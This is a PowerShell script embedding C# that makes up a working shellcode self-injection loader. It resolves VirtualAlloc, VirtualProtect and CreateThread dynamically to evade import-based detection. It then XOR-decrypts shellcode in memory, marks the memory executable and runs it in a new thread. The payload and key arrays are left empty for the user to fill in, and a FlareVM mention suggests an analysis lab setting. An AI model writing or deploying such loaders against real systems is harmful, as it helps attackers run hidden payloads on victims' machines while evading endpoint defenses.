# PowerShell Self-Injection Script using D-Invoke Techniques
# Flattened Namespace for FlareVM Compatibility

$cSharpCode = @"
using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace DInvoke
{
    public static class Native
    {
        // --- Delegates for Dynamic Invocation ---
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool VirtualProtectDelegate(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr CreateThreadDelegate(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CloseHandleDelegate(IntPtr hObject);

        // --- Wrapper Methods ---
        public static IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            IntPtr pFunc = Generic.GetLibraryAddress("kernel32.dll", "VirtualAlloc");
            var func = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(VirtualAllocDelegate));
            return func(lpAddress, dwSize, flAllocationType, flProtect);
        }

        public static bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            IntPtr pFunc = Generic.GetLibraryAddress("kernel32.dll", "VirtualProtect");
            var func = (VirtualProtectDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(VirtualProtectDelegate));
            return func(lpAddress, dwSize, flNewProtect, out lpflOldProtect);
        }

        public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId)
        {
            IntPtr pFunc = Generic.GetLibraryAddress("kernel32.dll", "CreateThread");
            var func = (CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(CreateThreadDelegate));
            return func(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, out lpThreadId);
        }

        public static uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds)
        {
            IntPtr pFunc = Generic.GetLibraryAddress("kernel32.dll", "WaitForSingleObject");
            var func = (WaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(WaitForSingleObjectDelegate));
            return func(hHandle, dwMilliseconds);
        }

        public static bool CloseHandle(IntPtr hObject)
        {
            IntPtr pFunc = Generic.GetLibraryAddress("kernel32.dll", "CloseHandle");
            var func = (CloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(CloseHandleDelegate));
            return func(hObject);
        }
    }

    public static class Generic
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        public static IntPtr GetLibraryAddress(string libraryName, string functionName)
        {
            IntPtr hModule = LoadLibrary(libraryName);
            if (hModule == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());

            IntPtr functionPtr = GetProcAddress(hModule, functionName);
            if (functionPtr == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());

            return functionPtr;
        }
    }

    public static class SelfInjection
    {
        public static IntPtr Inject(byte[] shellcode, byte[] xorKey, bool wait = false)
        {
            // 1. Allocate Memory (Read/Write)
            IntPtr baseAddr = Native.VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x04);
            if (baseAddr == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());
            
            // 2. Copy and Decrypt in memory
            Marshal.Copy(shellcode, 0, baseAddr, shellcode.Length);
            for (int i = 0; i < shellcode.Length; i++)
            {
                byte b = Marshal.ReadByte(baseAddr, i);
                Marshal.WriteByte(baseAddr, i, (byte)(b ^ xorKey[i % xorKey.Length]));
            }

            // 3. Change Memory Protection to Execute/Read (0x20)
            uint oldProtect;
            if (!Native.VirtualProtect(baseAddr, (uint)shellcode.Length, 0x20, out oldProtect))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            // 4. Create Thread to execute shellcode
            IntPtr threadId = IntPtr.Zero;
            IntPtr hThread = Native.CreateThread(IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, out threadId);

            if (hThread == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());

            if (wait)
            {
                Native.WaitForSingleObject(hThread, 0xFFFFFFFF);
                Native.CloseHandle(hThread);
            }

            return hThread;
        }
    }
}
"@

# Compile the code
Add-Type -TypeDefinition $cSharpCode -Language CSharp

# Example Usage: XOR-encrypted MessageBox shellcode (x86)
# NOTE: Replace with your actual shellcode and key
 $xoredShellcode = [byte[]] @()

 $xorKey = [byte[]] @()



try {
    Write-Host "Injecting shellcode..." -ForegroundColor Yellow
# C# breakpoint INT3
    [System.Diagnostics.Debugger]::Break()
# same as __debugbreak() in C
	$threadHandle = [DInvoke.SelfInjection]::Inject($xoredShellcode, $xorKey, $true)
if ($threadHandle -ne [IntPtr]::Zero) {
        Write-Host "[+] Injection successful. Thread Handle: $threadHandle" -ForegroundColor Green
    }

}
catch {
Write-Host "[-] Injection failed!" -ForegroundColor Red
    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
    
    # Check for inner exceptions (common with D-Invoke compilation issues)
    if ($_.Exception.InnerException) {
        Write-Host "[-] Details: $($_.Exception.InnerException.Message)" -ForegroundColor Red
    }
}
